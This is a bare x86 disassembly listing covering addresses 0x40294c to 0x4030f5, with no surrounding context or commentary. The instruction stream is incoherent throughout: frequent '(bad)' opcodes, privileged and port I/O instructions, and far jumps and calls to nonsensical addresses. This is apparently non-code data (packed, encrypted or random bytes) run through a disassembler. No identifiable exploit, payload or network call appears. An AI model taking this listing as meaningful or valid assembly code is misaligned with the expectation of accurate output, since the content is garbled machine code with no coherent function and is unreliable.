  40294c:	imul   ecx,DWORD PTR [edi-0x17],0x44
  402950:	push   esp
  402951:	inc    eax
  402952:	mov    bl,0xaf
  402954:	retf   0x1b38
  402957:	mov    esi,0x6353987b
  40295c:	shl    BYTE PTR [eax+0x3b67c2e8],0x21
  402963:	sub    BYTE PTR [ecx-0x2473642c],ah
  402969:	arpl   cx,sp
  40296b:	sbb    ebp,DWORD PTR [edx+0x15]
  40296e:	mov    esp,0x6a9bb527
  402973:	jbe    0x4029c7
  402975:	cmp    ebx,DWORD PTR cs:[esi]
  402978:	xor    al,0x18
  40297a:	scas   eax,DWORD PTR es:[edi]
  40297b:	ins    DWORD PTR es:[edi],dx
  40297c:	mov    edi,0x5f74b906
  402981:	jmp    0x5f2b2e0b
  402986:	arpl   WORD PTR [ebx+0x61],bp
  402989:	in     al,0x7b
  40298b:	add    ch,0xf1
  40298e:	(bad)  
  40298f:	(bad)  
  402990:	cwde   
  402991:	lea    eax,[ebp+0x284cb792]
  402997:	pop    edi
  402998:	fisub  WORD PTR [ebp-0x7ff721f6]
  40299e:	mov    ?,WORD PTR [ebp+0x4f]
  4029a1:	push   ds
  4029a2:	sub    DWORD PTR ds:0xe2662524,esp
  4029a8:	xlat   BYTE PTR ds:[ebx]
  4029a9:	ret    0x4114
  4029ac:	je     0x4029d3
  4029ae:	mov    dl,0xe8
  4029b0:	cmp    DWORD PTR [esi-0x48],ebx
  4029b3:	xchg   DWORD PTR [edi],eax
  4029b5:	icebp  
  4029b6:	adc    ah,BYTE PTR [esi+0x28]
  4029b9:	mov    WORD PTR ds:0xe30c31c1,cs
  4029bf:	xchg   edx,eax
  4029c0:	lods   al,BYTE PTR ds:[esi]
  4029c1:	inc    esp
  4029c2:	aaa    
  4029c3:	outs   dx,DWORD PTR ds:[esi]
  4029c4:	ffreep st(6)
  4029c6:	mov    WORD PTR [ecx],?
  4029c8:	or     esp,esi
  4029ca:	xor    BYTE PTR [ebp-0x61852e08],0x83
  4029d1:	lock or ecx,ecx
  4029d4:	ja     0x4029fc
  4029d6:	mov    eax,DWORD PTR [edi+0x119a056f]
  4029dc:	mov    dl,0x18
  4029de:	and    ebp,edx
  4029e0:	mov    esi,0x6fcf1daa
  4029e5:	hlt    
  4029e6:	dec    edi
  4029e7:	leave  
  4029e8:	jecxz  0x40298d
  4029ea:	addr16 ror bh,1
  4029ed:	cmp    bh,bl
  4029ef:	sbb    ebp,DWORD PTR [esi-0x15]
  4029f2:	and    eax,0x108551cc
  4029f7:	in     eax,0x91
  4029f9:	mov    al,0x7d
  4029fb:	jne    0x402991
  4029fd:	inc    edx
  4029fe:	jg     0x402a69
  402a00:	pop    ebp
  402a01:	xchg   edx,eax
  402a02:	imul   ebp,DWORD PTR [ebp-0x382ccb0c],0xffffffbc
  402a09:	and    DWORD PTR [esi-0x63],edx
  402a0c:	jo     0x4029e9
  402a0e:	fisubr DWORD PTR [ebp-0x3d]
  402a11:	sub    BYTE PTR ds:[edx+0x58],al
  402a15:	dec    ecx
  402a16:	in     eax,0x71
  402a18:	bswap  edi
  402a1a:	jno    0x402a0b
  402a1c:	popf   
  402a1d:	adc    al,0x6f
  402a1f:	adc    dh,BYTE PTR [eax+0x16]
  402a22:	push   ebp
  402a23:	out    dx,eax
  402a24:	cmp    DWORD PTR [eax-0x67da90f0],ebx
  402a2a:	bnd fs call 0x4796b273
  402a31:	push   esi
  402a32:	mov    ds:0x12b171a4,eax
  402a37:	fnstsw WORD PTR [ebx+0x2f]
  402a3a:	fdiv   DWORD PTR [eax+ebx*8]
  402a3d:	fst    QWORD PTR [ebp-0x76a590e3]
  402a43:	rcr    BYTE PTR ds:0x6d7f9404,cl
  402a49:	aam    0x82
  402a4b:	icebp  
  402a4c:	xchg   BYTE PTR [ebx],al
  402a4e:	mov    gs,edx
  402a50:	call   0x5d8b:0x51b506d2
  402a57:	enter  0x63f2,0xb4
  402a5b:	and    dl,BYTE PTR [ecx+0x5f]
  402a5e:	sbb    esi,DWORD PTR [edi-0x16]
  402a61:	or     BYTE PTR [ecx-0x3c],0x9e
  402a65:	xlat   BYTE PTR ds:[ebx]
  402a66:	repnz mov eax,ds:0x7027b986
  402a6c:	sub    bl,BYTE PTR [edi+0x45ab50de]
  402a72:	lds    edx,FWORD PTR [esp+edx*2]
  402a75:	or     dl,0xc
  402a78:	fwait
  402a79:	aam    0xdf
  402a7b:	pop    ds
  402a7c:	(bad)
  402a80:	out    dx,al
  402a81:	add    DWORD PTR [ebx-0x78],0xffffff95
  402a85:	push   eax
  402a86:	arpl   WORD PTR [esi-0x4e14d269],si
  402a8c:	lods   al,BYTE PTR ds:[esi]
  402a8d:	cmp    al,BYTE PTR [edi-0x7a]
  402a90:	mov    edi,0x7f05bd0d
  402a95:	test   eax,0x648d505
  402a9a:	int3   
  402a9b:	in     eax,0x5e
  402a9d:	dec    ebp
  402a9e:	push   ds
  402a9f:	and    bl,cl
  402aa1:	lods   al,BYTE PTR ds:[esi]
  402aa2:	add    ch,BYTE PTR [ebp-0x7e0440d9]
  402aa8:	imul   eax,DWORD PTR [ebp+0x3136400f],0x98f20bde
  402ab2:	push   ecx
  402ab3:	clc    
  402ab4:	inc    esi
  402ab5:	leave  
  402ab6:	ret    0x7a11
  402ab9:	cmp    eax,0xbf8dbdad
  402abe:	push   ss
  402abf:	xor    eax,0xf5db67ec
  402ac4:	xchg   DWORD PTR [ebp+0x0],ebx
  402ac7:	ja     0x402a6a
  402ac9:	jge    0x402ad2
  402acb:	jo     0x402b12
  402acd:	dec    eax
  402ace:	outs   dx,BYTE PTR ds:[esi]
  402acf:	out    0x7f,al
  402ad1:	cmp    al,0x3a
  402ad3:	nop
  402ad4:	addr16 in eax,dx
  402ad6:	mov    ebp,0xf614cbd4
  402adb:	imul   edx,esi,0x1d
  402ade:	mov    bl,0xd1
  402ae0:	hlt    
  402ae1:	imul   esi,DWORD PTR [esp+ebp*1-0x2e0574ca],0xe6496df4
  402aec:	lods   eax,DWORD PTR ds:[esi]
  402aed:	stc    
  402aee:	inc    ebx
  402aef:	xchg   BYTE PTR [ecx-0x7973952c],cl
  402af5:	loopne 0x402a8b
  402af7:	push   ebp
  402af8:	or     BYTE PTR [esp+edx*8+0x53],dl
  402afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402afd:	lock repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b00:	jp     0x402b74
  402b02:	sbb    eax,0x6d4e2a75
  402b07:	arpl   sp,dx
  402b09:	cs aaa 
  402b0b:	dec    esi
  402b0c:	and    BYTE PTR [ebp-0x3cd7a7a5],bh
  402b12:	ror    BYTE PTR [ecx+eiz*2+0xd],cl
  402b16:	push   ds
  402b17:	xchg   edi,eax
  402b18:	rcr    DWORD PTR [esi+0x22],cl
  402b1b:	and    ch,BYTE PTR [esi+eiz*1-0x61]
  402b1f:	(bad)  
  402b21:	aam    0x6a
  402b23:	ds popa 
  402b25:	xor    cl,BYTE PTR [ecx-0x39]
  402b28:	lock pop ss
  402b2a:	mov    ds:0x34e20fa0,eax
  402b2f:	and    ebx,DWORD PTR [eax+eax*1-0x71]
  402b33:	xchg   ebp,eax
  402b34:	int3   
  402b35:	push   ecx
  402b36:	mov    ch,ah
  402b38:	mov    ah,0xd8
  402b3a:	cmp    bl,BYTE PTR [ebp+0x41df5a53]
  402b40:	sbb    DWORD PTR [ebx+0x13814df8],eax
  402b46:	cmp    al,0x28
  402b48:	inc    eax
  402b49:	out    0x29,eax
  402b4b:	ins    BYTE PTR es:[edi],dx
  402b4c:	xchg   esi,eax
  402b4d:	push   ds
  402b4e:	jmp    0x402b6d
  402b50:	repz (bad) 
  402b52:	pop    edx
  402b53:	inc    ebp
  402b54:	add    eax,esp
  402b56:	xchg   esi,eax
  402b57:	dec    esp
  402b58:	cmc    
  402b59:	inc    edx
  402b5a:	xchg   BYTE PTR [ebx-0x31],cl
  402b5d:	jns    0x402bc8
  402b5f:	test   edx,eax
  402b61:	in     eax,dx
  402b62:	popa   
  402b63:	and    DWORD PTR [ecx+eiz*2],ebp
  402b66:	pop    edx
  402b67:	sahf   
  402b68:	pop    esp
  402b69:	into   
  402b6a:	mov    eax,ds:0xf1d23609
  402b6f:	mov    ecx,0x79ded610
  402b74:	cmp    bh,BYTE PTR [ecx-0x58]
  402b77:	fs or  eax,0xad863e15
  402b7d:	pop    ebx
  402b7e:	xchg   ecx,eax
  402b7f:	or     edx,DWORD PTR [ebx+edi*2-0x4f]
  402b83:	mov    eax,ds:0xf1a4edc5
  402b89:	jae    0x402b24
  402b8b:	adc    eax,esp
  402b8d:	test   eax,0xfc9692c0
  402b92:	or     esp,ebp
  402b94:	(bad)  
  402b96:	mov    cl,0xa7
  402b98:	mov    ebx,0xcb8e072f
  402b9d:	push   ds
  402b9e:	sbb    ebp,ecx
  402ba0:	pushf  
  402ba1:	cmc    
  402ba2:	int    0x41
  402ba4:	inc    esp
  402ba5:	(bad)  
  402ba7:	jno    0x402bd0
  402ba9:	jb     0x402c18
  402bab:	xor    al,0x6
  402bad:	lea    edi,[esi+0x1b]
  402bb0:	scas   al,BYTE PTR es:[edi]
  402bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bb2:	add    BYTE PTR ds:0xdd962c4e,dl
  402bb8:	xchg   ecx,eax
  402bb9:	jb     0x402be5
  402bbb:	and    ebp,DWORD PTR [edi-0x2a]
  402bbe:	and    DWORD PTR [ebx-0x38],ebx
  402bc1:	push   eax
  402bc2:	aad    0xe5
  402bc4:	sbb    BYTE PTR [eax],ch
  402bc6:	inc    ebx
  402bc7:	mov    dl,0xe6
  402bc9:	pop    ds
  402bca:	in     al,dx
  402bcb:	xchg   ebx,eax
  402bcc:	es lock adc eax,0xcf0e92a7
  402bd3:	fistp  QWORD PTR [esi-0x697526d1]
  402bd9:	xchg   ebx,eax
  402bda:	and    dl,bh
  402bdc:	push   esi
  402bdd:	pcmpgtd mm5,QWORD PTR ds:0x589befe1
  402be4:	imul   ebx,DWORD PTR [edx-0x5a],0xe41768b4
  402beb:	test   eax,0x9863e613
  402bf0:	sbb    esi,DWORD PTR [edx+0x7ff15101]
  402bf6:	xlat   BYTE PTR ds:[ebx]
  402bf7:	pusha  
  402bf8:	pusha  
  402bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bfa:	and    ecx,esi
  402bfc:	pop    es
  402bfd:	bound  eax,QWORD PTR [ebx+edx*4+0x6f]
  402c01:	cmc    
  402c02:	mov    edx,0xfe413080
  402c07:	mov    dl,BYTE PTR ds:0x8724ca64
  402c0d:	add    eax,0xb825dc33
  402c12:	mov    eax,ds:0x7da84eb4
  402c17:	loopne 0x402be0
  402c19:	and    edx,DWORD PTR [ebp-0x71]
  402c1c:	cmp    ah,ah
  402c1e:	aaa    
  402c1f:	jns    0x402c7a
  402c21:	mov    esi,0x45b8fd52
  402c26:	mov    bh,0x26
  402c28:	pop    edi
  402c29:	mov    BYTE PTR [eax-0xe],al
  402c2c:	(bad)  
  402c2d:	loop   0x402bb4
  402c2f:	outs   dx,BYTE PTR ds:[esi]
  402c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c31:	dec    esi
  402c32:	mov    esp,0x577f783a
  402c37:	xchg   ebp,eax
  402c38:	and    DWORD PTR [ebp+0x709d8fb2],eax
  402c3e:	push   0x183e1fa0
  402c43:	je     0x402c4f
  402c45:	cmc    
  402c46:	hlt    
  402c47:	mov    esi,0x4cf04437
  402c4c:	outs   dx,BYTE PTR ds:[esi]
  402c4d:	pop    esi
  402c4e:	in     eax,dx
  402c4f:	(bad)  
  402c50:	xor    al,0x50
  402c52:	jge    0x402c40
  402c54:	into   
  402c55:	push   es
  402c56:	mov    bh,0xc5
  402c58:	push   ebx
  402c59:	cmp    ch,bl
  402c5b:	sub    ecx,DWORD PTR [ebp+0x75daa3f]
  402c61:	add    ch,al
  402c63:	sub    ch,0x47
  402c66:	(bad)  
  402c67:	retf   
  402c68:	pusha  
  402c69:	idiv   BYTE PTR [edi+0x4]
  402c6c:	mov    ecx,0x2ca416f8
  402c71:	leave  
  402c72:	cli    
  402c73:	xor    ebx,DWORD PTR [esi+0x78c3a078]
  402c79:	not    ebx
  402c7b:	pop    ebp
  402c7c:	hlt    
  402c7d:	jmp    0x402cfd
  402c7f:	fiadd  WORD PTR [ebx-0x80]
  402c82:	daa    
  402c83:	xor    ebp,0x7e3c91ed
  402c89:	push   esi
  402c8a:	shl    BYTE PTR [esi],0x8e
  402c8d:	xchg   ebx,eax
  402c8e:	out    0x4d,eax
  402c90:	push   0xffffff84
  402c92:	cmp    eax,0xb0492cfc
  402c97:	lods   al,BYTE PTR ds:[esi]
  402c98:	add    al,0xf
  402c9a:	mov    ebp,0xefc57c96
  402c9f:	(bad)  
  402ca0:	pop    ds
  402ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ca2:	scas   eax,DWORD PTR es:[edi]
  402ca3:	mov    bl,0x27
  402ca5:	xchg   esp,eax
  402ca6:	aas    
  402ca7:	fldenv [ebx]
  402ca9:	fild   DWORD PTR [eax]
  402cab:	adc    ch,dl
  402cad:	(bad)  
  402cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402caf:	neg    DWORD PTR ds:[edx+0x47]
  402cb3:	bound  eax,QWORD PTR [edi+0x150ce174]
  402cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cba:	sbb    esi,DWORD PTR [esi]
  402cbc:	(bad)  
  402cbd:	fidivr DWORD PTR [ebx-0x52b840b5]
  402cc3:	dec    ecx
  402cc4:	shl    DWORD PTR [esi-0x127df35f],0xb7
  402ccb:	sbb    eax,0x5d46da27
  402cd0:	iret   
  402cd1:	xchg   bl,bh
  402cd3:	iret   
  402cd4:	dec    edi
  402cd5:	cmp    BYTE PTR [edi+0x6a],0x4
  402cd9:	fucom  st(2)
  402cdb:	dec    edi
  402cdc:	inc    esi
  402cdd:	inc    edi
  402cde:	(bad)  
  402cdf:	mov    ds:0xae4946a6,eax
  402ce4:	or     al,0x2a
  402ce6:	lahf   
  402ce7:	ret    0x3bc0
  402cea:	stos   BYTE PTR es:[edi],al
  402ceb:	out    dx,eax
  402cec:	jno    0x402d3b
  402cee:	es test eax,0x48ed32b9
  402cf4:	or     al,0x7
  402cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cf7:	push   ebx
  402cf8:	lods   eax,DWORD PTR ds:[esi]
  402cf9:	xor    ebx,DWORD PTR [ecx]
  402cfb:	dec    esi
  402cfc:	adc    eax,DWORD PTR [edi+0x30a756d5]
  402d02:	sub    eax,0xa2e98edf
  402d07:	xor    BYTE PTR [edi+ebp*4-0x31f5fb48],0xa5
  402d0f:	push   cs
  402d10:	stc    
  402d11:	sar    BYTE PTR ds:0x8535a314,0xff
  402d18:	outs   dx,BYTE PTR ds:[esi]
  402d19:	dec    ebx
  402d1a:	fst    st(5)
  402d1c:	sbb    DWORD PTR [ebx-0xb],ecx
  402d1f:	xchg   ebx,eax
  402d20:	jmp    FWORD PTR [eax+0x25]
  402d23:	mov    ss,esp
  402d25:	pop    ds
  402d26:	jle    0x402d09
  402d28:	(bad)  
  402d29:	mov    ch,0x8e
  402d2b:	fsub   DWORD PTR [eax+0x3]
  402d2e:	test   eax,0x1382740c
  402d33:	xor    BYTE PTR [edi-0x7f],0xa0
  402d37:	cmp    edx,esi
  402d39:	ret    
  402d3a:	sbb    al,0x96
  402d3c:	jmp    DWORD PTR [ebx+ebp*2]
  402d3f:	rcr    BYTE PTR [edx-0x1e5e7d2f],0x2d
  402d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d47:	xor    dl,BYTE PTR [ecx+0x28]
  402d4a:	outs   dx,DWORD PTR ds:[esi]
  402d4b:	mov    ch,dh
  402d4d:	mov    dh,0xe4
  402d4f:	cmc    
  402d50:	jae    0x402d44
  402d52:	sti    
  402d53:	bnd jbe 0x402d5b
  402d56:	int3   
  402d57:	mov    ebx,0xb080b317
  402d5c:	adc    BYTE PTR [eax+ebx*8],dh
  402d5f:	dec    ecx
  402d60:	jae    0x402cf1
  402d62:	imul   edi,DWORD PTR [edi+0x3a],0x45
  402d66:	stc    
  402d67:	pop    ss
  402d68:	sbb    DWORD PTR [edx-0xd],ebp
  402d6b:	iret   
  402d6c:	aad    0x86
  402d6e:	(bad)  
  402d6f:	and    al,0xca
  402d71:	shl    bh,1
  402d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d74:	dec    eax
  402d75:	add    dl,ch
  402d77:	or     eax,0xfbdfaffb
  402d7c:	or     esi,esi
  402d7e:	pusha  
  402d7f:	xchg   BYTE PTR [edi+0x76],dl
  402d82:	add    BYTE PTR [bp+si+0x78e6],cl
  402d87:	mov    dl,BYTE PTR [ebx]
  402d89:	cmc    
  402d8a:	les    ecx,FWORD PTR [eax]
  402d8c:	clc    
  402d8d:	and    DWORD PTR [edi+0x7c],edi
  402d90:	push   eax
  402d91:	push   ebp
  402d92:	sub    ah,BYTE PTR [eax-0x5c]
  402d95:	and    ecx,ecx
  402d97:	xchg   ebp,eax
  402d98:	mov    ecx,0x1023e6c8
  402d9d:	sub    ecx,esp
  402d9f:	sti    
  402da0:	cmp    bh,al
  402da2:	fstp   DWORD PTR [edx-0x5ca3ad26]
  402da8:	ret    0x6bb9
  402dab:	inc    esp
  402dac:	push   ds
  402dad:	repz test BYTE PTR cs:[ecx+ebp*2-0x69247a68],0x7d
  402db7:	stc    
  402db8:	mov    al,ds:0xf416cde5
  402dbd:	sar    DWORD PTR [edi+0x6d341ee2],1
  402dc3:	push   0xffffffa1
  402dc5:	or     eax,0x49c50a5d
  402dca:	pushf  
  402dcb:	xchg   BYTE PTR [eax+0x13d2269d],ch
  402dd1:	sbb    BYTE PTR [ecx+0x66],dl
  402dd4:	adc    DWORD PTR [edx-0x7],edx
  402dd7:	dec    edx
  402dd8:	xchg   edi,eax
  402dd9:	add    DWORD PTR [esi-0x3ea4bd95],eax
  402ddf:	push   0xffffff8e
  402de1:	inc    ecx
  402de2:	in     al,dx
  402de3:	in     eax,dx
  402de4:	fs inc eax
  402de6:	in     al,dx
  402de7:	mov    bh,0x5a
  402de9:	inc    esp
  402dea:	push   ebx
  402deb:	xchg   ebp,eax
  402dec:	push   eax
  402ded:	xchg   ecx,eax
  402dee:	in     al,0x9a
  402df0:	out    0x27,eax
  402df2:	and    al,0x84
  402df4:	loope  0x402dc6
  402df6:	mov    ebp,DWORD PTR [ebp-0x193a6959]
  402dfc:	jge    0x402e49
  402dfe:	inc    eax
  402dff:	mov    cl,0x62
  402e01:	or     al,0x7e
  402e03:	pop    esp
  402e04:	rcr    DWORD PTR [esp+ebp*1-0x2a],1
  402e08:	mov    ecx,0x3413ac38
  402e0d:	sub    BYTE PTR [eax+0x56],cl
  402e10:	xbegin 0xa5d6d62d
  402e16:	sub    eax,edx
  402e18:	cmc    
  402e19:	sbb    al,0x48
  402e1b:	mov    edi,0x36715de1
  402e20:	in     eax,dx
  402e21:	jge    0x402e13
  402e23:	add    esi,ecx
  402e25:	(bad)  
  402e26:	in     al,dx
  402e27:	es jne 0x402ea2
  402e2a:	in     eax,dx
  402e2b:	dec    edi
  402e2c:	call   DWORD PTR [edi]
  402e2e:	std    
  402e2f:	mov    BYTE PTR [eax+0x36],al
  402e32:	call   0x66502b47
  402e37:	das    
  402e38:	sbb    bl,dh
  402e3a:	push   esi
  402e3b:	in     eax,dx
  402e3c:	xchg   dh,bh
  402e3e:	jbe    0x402ea8
  402e40:	jle    0x402e9a
  402e42:	hlt    
  402e43:	dec    edi
  402e44:	ficomp DWORD PTR ds:[edx-0x37]
  402e48:	dec    ebx
  402e49:	cmp    al,0x4d
  402e4b:	out    dx,eax
  402e4c:	loop   0x402ea9
  402e4e:	xor    dl,BYTE PTR [ebx+ebp*4+0x74a98098]
  402e55:	cmp    edx,DWORD PTR [esi-0x58057ad3]
  402e5b:	mov    esi,0x968fe6f7
  402e60:	or     eax,0xe07838c3
  402e65:	ret    
  402e66:	test   dl,bl
  402e68:	inc    edx
  402e69:	sti    
  402e6a:	sbb    DWORD PTR [esp+eax*4],edi
  402e6d:	dec    esp
  402e6e:	push   ecx
  402e6f:	sub    esi,DWORD PTR [esi]
  402e71:	shl    BYTE PTR [edi-0x4e9fe2e3],cl
  402e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e78:	fsub   st(7),st
  402e7a:	fnstenv [ebx-0x70]
  402e7d:	pop    eax
  402e7e:	xor    dh,BYTE PTR [ecx]
  402e80:	mov    ecx,0x8aafe8b9
  402e85:	fwait
  402e86:	push   ecx
  402e87:	sbb    edi,DWORD PTR [esi-0x30]
  402e8a:	xchg   bl,al
  402e8c:	call   0x25e53022
  402e91:	shr    BYTE PTR [eax+0x73],0x6f
  402e95:	lods   al,BYTE PTR ds:[esi]
  402e96:	add    edi,DWORD PTR [esi-0x27]
  402e99:	jl     0x402e70
  402e9b:	retf   
  402e9c:	cmp    bh,BYTE PTR ds:0x661e0b8c
  402ea2:	or     al,0x32
  402ea4:	mov    BYTE PTR [edi+0x4b],dl
  402ea7:	sbb    esi,DWORD PTR ds:0x39653fb0
  402ead:	sbb    ebx,DWORD PTR [esi-0x6c]
  402eb0:	jo     0x402e72
  402eb2:	inc    eax
  402eb3:	fldenv [esp+ecx*8-0xc]
  402eb7:	in     eax,0xa3
  402eb9:	pop    ebp
  402eba:	mov    edx,0x2a0b32c7
  402ebf:	pop    ds
  402ec0:	mov    ebx,0xcf42afcd
  402ec5:	imul   edx,DWORD PTR [eax],0x73
  402ec8:	adc    BYTE PTR ds:0xec309e6b,cl
  402ece:	dec    ebp
  402ecf:	xchg   ebp,eax
  402ed0:	inc    ebp
  402ed2:	pslld  mm1,QWORD PTR [edi+0x5d]
  402ed6:	add    eax,0x7b8818c8
  402edb:	and    DWORD PTR [eax+0x7e43534a],ebx
  402ee1:	sbb    bh,BYTE PTR [edx-0x7e5d75c4]
  402ee7:	cmp    DWORD PTR [edi+0x1974e9c0],ecx
  402eed:	mov    WORD PTR [ecx-0x27da3513],es
  402ef3:	popa   
  402ef4:	shr    BYTE PTR [ecx],cl
  402ef6:	call   0x7188:0x58ca65b3
  402efd:	or     ebp,eax
  402eff:	add    edx,edi
  402f01:	bound  esi,QWORD PTR [edi-0x40]
  402f04:	(bad)  
  402f05:	fstp   QWORD PTR [edx]
  402f07:	jge    0x402f18
  402f09:	fist   DWORD PTR [ebx-0x79]
  402f0c:	(bad)  
  402f0d:	push   ebx
  402f0e:	jg     0x402f71
  402f10:	shl    BYTE PTR [edi],1
  402f12:	jge    0x402ea7
  402f14:	les    ebp,FWORD PTR [eax+0x36]
  402f17:	(bad)  
  402f19:	push   ecx
  402f1a:	mov    cl,0x4
  402f1c:	retf   0x5ec9
  402f1f:	adc    eax,0xa43d5185
  402f24:	pop    eax
  402f25:	je     0x402f00
  402f27:	and    ah,BYTE PTR [ecx-0x27ff2e03]
  402f2d:	sub    dl,BYTE PTR [ebp+0x3a]
  402f30:	gs int3 
  402f32:	push   edx
  402f33:	arpl   WORD PTR [bp-0x55],si
  402f37:	fld    QWORD PTR [edi-0x547e4de1]
  402f3d:	adc    esi,eax
  402f3f:	cdq    
  402f40:	or     edi,DWORD PTR [esi]
  402f42:	or     dl,BYTE PTR [ecx-0xc2b1208]
  402f48:	hlt    
  402f49:	in     eax,0x95
  402f4b:	and    DWORD PTR [ebx-0x6e493b32],edx
  402f51:	cmc    
  402f52:	mov    DWORD PTR [ebp+0x49],eax
  402f55:	in     al,dx
  402f56:	mov    ds:0x26f5d265,al
  402f5b:	mov    al,0xc8
  402f5d:	aaa    
  402f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f5f:	mov    ch,0xa7
  402f61:	mov    ecx,0xa019af1f
  402f66:	fiadd  DWORD PTR [ecx]
  402f68:	sbb    esp,0xc6a35302
  402f6e:	push   esi
  402f6f:	push   ebx
  402f70:	push   esi
  402f71:	scas   al,BYTE PTR es:[edi]
  402f72:	scas   eax,DWORD PTR es:[edi]
  402f73:	lea    ebp,[esi]
  402f75:	cli    
  402f76:	lds    esi,FWORD PTR [edi+0x7]
  402f79:	xor    al,0xbe
  402f7b:	outs   dx,DWORD PTR ds:[esi]
  402f7c:	not    DWORD PTR [esi-0x33]
  402f7f:	mov    ch,0x15
  402f81:	lods   eax,DWORD PTR ds:[esi]
  402f82:	leave  
  402f83:	jmp    0x6bc8:0x4b244b42
  402f8a:	xchg   ebp,eax
  402f8b:	es push ebx
  402f8d:	cmp    DWORD PTR [esi],eax
  402f8f:	xchg   ebp,eax
  402f90:	lods   eax,DWORD PTR ds:[esi]
  402f91:	dec    ebx
  402f92:	adc    cl,BYTE PTR [eax-0x3e]
  402f95:	xor    DWORD PTR [edx+eax*1-0x7040f9a2],eax
  402f9c:	mov    esp,0xe5d7fa38
  402fa1:	sub    DWORD PTR ds:0xa569c240,0x7d
  402fa8:	leave  
  402fa9:	in     al,0x95
  402fab:	in     eax,0x1b
  402fad:	test   eax,0x77e67b8c
  402fb2:	retf   
  402fb3:	test   BYTE PTR [ebx-0x65239c3a],cl
  402fb9:	inc    esp
  402fba:	rcl    bh,0x38
  402fbd:	adc    eax,0x1ef693ab
  402fc2:	push   ebp
  402fc3:	fs xchg edx,eax
  402fc5:	and    DWORD PTR [edx-0x5900f9d7],esp
  402fcb:	mov    ds:0x8e914bda,eax
  402fd0:	or     DWORD PTR ds:0xa9574f6e,0xb433d411
  402fda:	mov    ch,0xaf
  402fdc:	jge    0x402fcc
  402fde:	push   ebp
  402fdf:	and    ecx,esp
  402fe1:	mov    eax,0x4babb82c
  402fe6:	sbb    BYTE PTR [ebx-0x26],dl
  402fe9:	mov    es,WORD PTR [eax]
  402feb:	mul    DWORD PTR [eax]
  402fed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fee:	jecxz  0x403016
  402ff0:	adc    al,BYTE PTR [edx+0x6f]
  402ff3:	dec    esp
  402ff4:	pop    ecx
  402ff5:	xchg   edx,ebp
  402ff7:	sti    
  402ff8:	ret    
  402ff9:	cmp    eax,0x5d88fd6e
  402ffe:	neg    DWORD PTR [ebx+0xb]
  403001:	bound  edx,QWORD PTR [eax-0x5e]
  403004:	or     dh,cl
  403006:	cld    
  403007:	mov    dl,0x89
  403009:	imul   eax,DWORD PTR [eax+0x18],0xffffff8d
  40300d:	push   eax
  40300e:	sar    BYTE PTR [eax],cl
  403010:	dec    esp
  403011:	call   0xce7eb8c2
  403016:	stc    
  403017:	hlt    
  403018:	ja     0x403056
  40301a:	mov    esp,0x4bd123e8
  40301f:	scas   al,BYTE PTR es:[edi]
  403020:	cs inc esi
  403022:	inc    ebp
  403023:	dec    esp
  403024:	aas    
  403025:	call   0x2cb1:0x5dcd826b
  40302c:	inc    BYTE PTR [ebp+0x48]
  40302f:	rol    BYTE PTR [edi-0x5e],0x7f
  403033:	push   esp
  403034:	fnstsw WORD PTR ds:0xdcde8b0c
  40303a:	inc    esi
  40303b:	out    dx,eax
  40303c:	sbb    DWORD PTR [edx],esp
  40303e:	shl    DWORD PTR [edx-0x23dce289],1
  403044:	aam    0xcc
  403046:	mov    ecx,0xf104e913
  40304b:	pop    ss
  40304c:	ret    
  40304d:	sub    al,0xae
  40304f:	xchg   ebp,eax
  403050:	sbb    BYTE PTR [esi],0x74
  403053:	cmp    BYTE PTR [edi],cl
  403055:	rol    DWORD PTR [edx],1
  403057:	in     al,dx
  403058:	mov    esi,0x5c769b93
  40305d:	leave  
  40305e:	push   ds
  40305f:	fidivr WORD PTR [ecx]
  403061:	jp     0x402fe4
  403063:	adc    BYTE PTR ds:0x2913a281,cl
  403069:	pushf  
  40306a:	mov    ebp,0x8ae3b5f4
  40306f:	pushf  
  403070:	gs push ebp
  403072:	pop    eax
  403073:	mov    eax,0x18d00673
  403078:	rcr    DWORD PTR [edx+0x22],0x1e
  40307c:	repnz test al,0xb4
  40307f:	lods   al,BYTE PTR ds:[esi]
  403080:	pop    ebp
  403081:	and    BYTE PTR [ebp+ebx*8-0x73],dl
  403085:	in     al,dx
  403086:	test   BYTE PTR gs:[edi-0x5],dl
  40308a:	or     eax,0xac94e73e
  40308f:	cmc    
  403090:	mov    ds:0x40a4b8ba,eax
  403095:	mov    BYTE PTR [esi+0x6d9f604d],dh
  40309b:	fnsave ds:0xc5974b39
  4030a1:	jl     0x4030ee
  4030a3:	je     0x40306b
  4030a5:	imul   edx,DWORD PTR [ebx+0x67],0xffffffc8
  4030a9:	pop    ss
  4030aa:	xchg   ebx,eax
  4030ab:	mov    bh,0x97
  4030ad:	push   ebp
  4030ae:	sbb    eax,0x7321857
  4030b3:	pop    ss
  4030b4:	mov    WORD PTR [edi],fs
  4030b6:	inc    edi
  4030b7:	mov    eax,ds:0x6c1fcd98
  4030bc:	cmp    al,0xdd
  4030be:	push   0x34
  4030c0:	retf   
  4030c1:	xor    dl,BYTE PTR [edi+0x7b771725]
  4030c7:	push   es
  4030c8:	cwde   
  4030c9:	pop    edi
  4030ca:	and    esi,eax
  4030cc:	xor    ah,BYTE PTR [eax+0x53]
  4030cf:	jmp    0xe901:0xe640ec7a
  4030d6:	call   0xbd6b:0x6c5e36d1
  4030dd:	or     ebx,0x2bf0efac
  4030e3:	mov    esi,0x2b5faa18
  4030e8:	adc    edi,DWORD PTR [esi+0x4b]
  4030eb:	les    esp,FWORD PTR [eax-0x6]
  4030ee:	out    dx,al
  4030ef:	jl     0x40315b
  4030f1:	mov    ah,0xfe
  4030f3:	(bad)  
  4030f4:	xchg   edx,eax
  4030f5:	xchg   ecx,eax
